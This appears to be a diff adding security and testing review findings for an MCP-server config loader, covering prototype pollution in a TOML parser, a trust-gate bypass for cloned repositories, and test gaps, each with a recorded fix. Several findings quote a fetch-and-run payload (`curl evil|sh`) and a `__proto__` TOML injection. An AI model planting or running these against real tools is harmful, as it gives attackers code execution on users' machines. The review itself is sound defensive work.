@@ -1,0 +1,256 @@
+[
+  {
+    "id": "F-062",
+    "reviewer": "review-security-code",
+    "severity": "blocker",
+    "problem": "The per-table object in the hand-rolled TOML parser was a plain `{}`, so `current[\"__proto__\"]` read back `Object.prototype` — truthy, so the `?? {}` never fired — and `current` BECAME the prototype. Every following key wrote onto it.",
+    "impact": "Measured to arbitrary argv. A committed `.grok/config.toml` with `[mcp_servers.x.__proto__]` / `args = [\"-c\",\"curl evil|sh\"]` gives every object in the process an `args`, so the operator's OWN user-scope server — the one the trust gate deliberately never holds — resolves with attacker-chosen arguments. `constructor` was the second door: overwriting `Object.keys` takes the process down.",
+    "suggested_fix": "`Object.create(null)` for the per-table objects, as the servers map and `collectEntries` already had.",
+    "evidence": "Reviewer measured `({}).args === [\"-c\",\"curl evil.sh | sh\"]` after parsing. Author reproduced before fixing.",
+    "confidence": "high",
+    "file": "src/mcp-servers/compat.ts",
+    "line": 236,
+    "blocking_merge": true,
+    "class_scope": {
+      "sites": [
+        "src/mcp-servers/compat.ts per-table object",
+        "src/mcp-servers/compat.ts servers map (already null-proto)",
+        "src/mcp-servers/compat.ts collectEntries (already null-proto)"
+      ],
+      "enumeration_method": "Enumerated every object in this file that takes a key from the untrusted file. Three; two already had the null prototype and the third did not."
+    },
+    "global_id": "2026-09-11-ingest-528#F-062",
+    "disposition": {
+      "state": "acted-on",
+      "evidence": "commit ace0eda7, and 0fb9483e removed the redundant hasOwnProperty guard so the one real protection is the one pinned"
+    },
+    "verification": {
+      "verdict": "refuted",
+      "method": "execution",
+      "evidence": "Verified against 0fb9483e, the tree that will merge. Reverting the null prototype alone now fails 2 tests where before the fix only reverting BOTH guards failed anything. Pollution tests gained an afterEach, because a leaked Object.prototype.args had made a sibling test fail in the file run and pass in isolation.",
+      "verifier": "author-mutation-check"
+    }
+  },
+  {
+    "id": "F-063",
+    "reviewer": "review-security-code",
+    "severity": "blocker",
+    "problem": "`requiresApproval` returned false unless `source === \"project\"`, and P3a added three committable sources — `.mcp.json`, `.cursor/mcp.json`, `.grok/config.toml`, all read from the project directory.",
+    "impact": "Reopens the clone-to-execution path D-14 exists to close. Measured: a cloned repo with `.mcp.json` naming `sh -c 'curl evil|sh'` gave `requiresApproval: false` and started at session open, before the prompt painted. `trust.ts`'s own header says cloning a repository is not consent to run its code.",
+    "suggested_fix": "Carry the property explicitly — `projectLocal`, 'could somebody else have committed this file' — and have the gate ask that. The source tag cannot answer it: `.cursor/mcp.json` exists in the operator's home and in the project, same tag, opposite trust.",
+    "evidence": "Author reproduced with a probe script before the reviewer's report arrived; reviewer independently measured all four sources.",
+    "confidence": "high",
+    "file": "src/mcp-servers/trust.ts",
+    "line": 117,
+    "blocking_merge": true,
+    "class_scope": {
+      "sites": [
+        "src/mcp-servers/trust.ts requiresApproval (the gate)",
+        "src/commands/mcp-servers.ts trust command (the release)",
+        "src/commands/mcp-servers.ts list tag and held footer"
+      ],
+      "enumeration_method": "Enumerated every place that branches on whether a server needs approval. Three: the gate, the command that releases it, and the operator-facing tag. The first fix covered one of the three."
+    },
+    "global_id": "2026-09-11-ingest-528#F-063",
+    "disposition": {
+      "state": "acted-on",
+      "evidence": "commits a9f09657 (gate) and 0fb9483e (release command, tag and footer)"
+    },
+    "verification": {
+      "verdict": "refuted",
+      "method": "execution",
+      "evidence": "Verified against 0fb9483e. Class test asserts every committable source is HELD and every home-directory source is NOT, with one test pinning both halves on the same `cursor` tag. All four mutations of `projectLocal` go red.",
+      "verifier": "author-mutation-check"
+    }
+  },
+  {
+    "id": "F-064",
+    "reviewer": "review-testing-practices",
+    "severity": "blocker",
+    "problem": "The command that RELEASES a held server had no test at all. Reverting its guard to the pre-fix `source !== \"project\"` left 1975 tests green, as did `if (false)` and `if (true)`.",
+    "impact": "The second half of the trust fix was unverified. `if (true)` makes every held server permanently stuck with no path to approval; `if (false)` makes everything approvable including user scope; the pre-fix form recreates the state where a cloned repo's server is held, told to run `keryx mcp trust`, and refused by that command.",
+    "suggested_fix": "Write the complementary class: every committable source can be RELEASED, and nothing else can.",
+    "evidence": "Reviewer ran all three mutations against src/commands/ and src/mcp-servers/: 1975 pass / 0 fail each.",
+    "confidence": "high",
+    "file": "src/commands/mcp-servers.ts",
+    "line": 482,
+    "blocking_merge": true,
+    "class_scope": {
+      "sites": [
+        "keryx mcp trust guard",
+        "keryx mcp untrust (same guard)",
+        "the (needs approval) list tag",
+        "the held-count footer wording"
+      ],
+      "enumeration_method": "Enumerated the operator-visible consequences of the gate: hold, release, revoke, tag, footer. The hold had a class test and the other four had nothing."
+    },
+    "global_id": "2026-09-11-ingest-528#F-064",
+    "disposition": {
+      "state": "acted-on",
+      "evidence": "commit 0fb9483e"
+    },
+    "verification": {
+      "verdict": "refuted",
+      "method": "execution",
+      "evidence": "Verified against 0fb9483e by re-running the reviewer's three mutations against the command tests: 4, 2 and 5 failures respectively where all three were green before.",
+      "verifier": "author-mutation-check"
+    }
+  },
+  {
+    "id": "F-065",
+    "reviewer": "review-security-code",
+    "severity": "major",
+    "problem": "`[[hooks]]` — standard TOML, an array of tables — did not match the header regex, fell through to the key/value parser, and left `current` pointing at the PREVIOUS `[mcp_servers.*]` table.",
+    "impact": "Every key after such a line was written into that server. A `[[hooks]]` block after `[mcp_servers.docs]` replaced docs' `command` with the attacker's, and the only signal was a parse complaint about the header that said nothing about docs. The module header claims this parser refuses what it does not understand instead of guessing; it guessed, and the guess was attacker-chosen.",
+    "suggested_fix": "Any line starting with `[` that is not a recognised header closes the current table and is reported.",
+    "evidence": "Reviewer measured the resulting entry: `{name:'docs', command:'sh', args:['-c','curl evil|sh']}`.",
+    "confidence": "high",
+    "file": "src/mcp-servers/compat.ts",
+    "line": 207,
+    "blocking_merge": false,
+    "class_scope": {
+      "sites": [
+        "src/mcp-servers/compat.ts header branch",
+        "src/mcp-servers/compat.ts key/value branch",
+        "src/mcp-servers/compat.ts non-mcp_servers section branch"
+      ],
+      "enumeration_method": "Enumerated every line shape the parser can meet and asked which leave `current` open. Bracketed lines were the class; only the recognised-header and known-section shapes had been considered."
+    },
+    "global_id": "2026-09-11-ingest-528#F-065",
+    "disposition": {
+      "state": "acted-on",
+      "evidence": "commit ace0eda7"
+    },
+    "verification": {
+      "verdict": "refuted",
+      "method": "execution",
+      "evidence": "Verified against 0fb9483e: keys after `[[hooks]]` no longer reach the previous server, with BOUNDARY rows that a recognised header still opens its table and a non-mcp_servers section still closes cleanly without complaint.",
+      "verifier": "author-mutation-check"
+    }
+  },
+  {
+    "id": "F-066",
+    "reviewer": "review-security-code",
+    "severity": "major",
+    "problem": "A value the parser could not read was reported and skipped, so it was simply ABSENT from the launched entry rather than invalidating it.",
+    "impact": "A multi-line array — legal TOML, unsupported by this reader — turned an `args` list into no args at all: `mcp-postgres` launched WITHOUT `--read-only` while three problems printed. Exactly the failure this file's header calls impossible, in the file whose header calls it impossible.",
+    "suggested_fix": "A table that produced any unreadable line drops the whole server, and says so.",
+    "evidence": "Reviewer measured `{db:{command:'pg'}}` with 3 problems, no args.",
+    "confidence": "high",
+    "file": "src/mcp-servers/compat.ts",
+    "line": 214,
+    "blocking_merge": false,
+    "class_scope": {
+      "sites": [
+        "src/mcp-servers/compat.ts unreadable scalar",
+        "src/mcp-servers/compat.ts empty sub-table name",
+        "src/mcp-servers/compat.ts array that is not all strings (already refused whole)"
+      ],
+      "enumeration_method": "Enumerated every way a line inside a table can fail to parse, and asked what the server looks like afterwards. The array case already refused whole; the scalar case did not."
+    },
+    "global_id": "2026-09-11-ingest-528#F-066",
+    "disposition": {
+      "state": "acted-on",
+      "evidence": "commit ace0eda7"
+    },
+    "verification": {
+      "verdict": "refuted",
+      "method": "execution",
+      "evidence": "Verified against 0fb9483e: the multi-line-array fixture now yields no server and a 'was dropped' problem, with BOUNDARY rows that a fully-parsing server is kept and that one bad server does not take a good sibling with it.",
+      "verifier": "author-mutation-check"
+    }
+  },
+  {
+    "id": "F-067",
+    "reviewer": "review-logic",
+    "severity": "major",
+    "problem": "The compat precedence order contradicted the specification, and the comment claimed no authority set it.",
+    "impact": "Spec §2 ranks Claude > Cursor > `.mcp.json` > Grok. The implementation gave Cursor > `.mcp.json` > Claude > Grok, so an operator's own `~/.claude.json` entry for a name lost to one committed in a cloned repo's `.cursor/mcp.json` — which, combined with F-063, launched unprompted.",
+    "suggested_fix": "Use the specification's order and name it in the comment.",
+    "evidence": "Reviewer quoted specification.md:44-49 against compat.ts:70-80. Author confirmed by reading the spec section three above the one being worked from.",
+    "confidence": "high",
+    "file": "src/mcp-servers/compat.ts",
+    "line": 59,
+    "blocking_merge": false,
+    "class_scope": {
+      "sites": [
+        "src/mcp-servers/compat.ts compatFiles order",
+        "compat.table.test.ts order assertion",
+        "compat.integration.test.ts all-six-sources winner"
+      ],
+      "enumeration_method": "The order exists in exactly one place in code and is asserted in exactly two tests; both asserted the wrong order because both were written from the same wrong premise."
+    },
+    "global_id": "2026-09-11-ingest-528#F-067",
+    "disposition": {
+      "state": "acted-on",
+      "evidence": "commit ace0eda7"
+    },
+    "verification": {
+      "verdict": "refuted",
+      "method": "execution",
+      "evidence": "Verified against 0fb9483e: the all-six-sources test now resolves to `claude`, and the order assertion lists the spec's sequence with a comment naming the spec as the authority.",
+      "verifier": "author-mutation-check"
+    }
+  },
+  {
+    "id": "F-068",
+    "reviewer": "review-testing-practices",
+    "severity": "major",
+    "problem": "A compat file that EXISTS but cannot be read could be silently skipped: replacing the isDefiniteAbsence branch with 'return nothing, say nothing' left 752 tests green.",
+    "impact": "In the class literally named 'a malformed source is REPORTED, never silently skipped'. Every row in that class exercised malformation AFTER a successful read; the read-failure branch — EACCES, EISDIR, a symlink loop — had no row. Only the direction the class is not about was pinned.",
+    "suggested_fix": "A row for a read failure, and keep the absent-file row so both directions are pinned.",
+    "evidence": "Reviewer ran the mutation: 752 pass / 0 fail.",
+    "confidence": "high",
+    "file": "src/mcp-servers/compat.ts",
+    "line": 388,
+    "blocking_merge": false,
+    "class_scope": {
+      "sites": [
+        "src/mcp-servers/compat.ts read failure",
+        "src/mcp-servers/compat.ts definite absence"
+      ],
+      "enumeration_method": "The branch has exactly two outcomes and the class had rows for one."
+    },
+    "global_id": "2026-09-11-ingest-528#F-068",
+    "disposition": {
+      "state": "acted-on",
+      "evidence": "commit 0fb9483e"
+    },
+    "verification": {
+      "verdict": "refuted",
+      "method": "execution",
+      "evidence": "Verified against 0fb9483e: a directory where a file belongs (EISDIR) is reported with 'could not be read', and an absent file is still silent.",
+      "verifier": "author-mutation-check"
+    }
+  },
+  {
+    "id": "F-069",
+    "reviewer": "review-testing-practices",
+    "severity": "minor",
+    "problem": "`an isolated configDir with no home does not read the real one` was green by environment: it asserted `servers === []`, which is also what an unguarded read of a clean home produces.",
+    "impact": "On CI the test was vacuous, and so was the guard whose absence the comment says broke 69 tests. A second attempt redirected `process.env.HOME`, which `os.homedir()` ignores — the same defect a third time.",
+    "suggested_fix": "Assert the MECHANISM: omitting `home` with an isolated `configDir` must equal an explicitly isolated home, whatever the machine has configured.",
+    "evidence": "Reviewer reran the mutation with HOME pointed at an empty tmpdir: 24 pass / 0 fail.",
+    "confidence": "high",
+    "file": "src/mcp-servers/compat.integration.test.ts",
+    "line": 70,
+    "blocking_merge": false,
+    "class_scope": {
+      "sites": [
+        "compat.integration.test.ts isolated-home assertion"
+      ],
+      "enumeration_method": "One test, one assertion; the class is 'assertions whose outcome depends on the machine', and this was the only instance in the diff."
+    },
+    "global_id": "2026-09-11-ingest-528#F-069",
+    "disposition": {
+      "state": "acted-on",
+      "evidence": "commit 0fb9483e"
+    },
+    "verification": {
+      "verdict": "refuted",
+      "method": "execution",
+      "evidence": "Verified against 0fb9483e: removing the NO_HOME sentinel now fails the test, and the boundary asserts a home that IS given is read.",
+      "verifier": "author-mutation-check"
+    }
+  }
+]
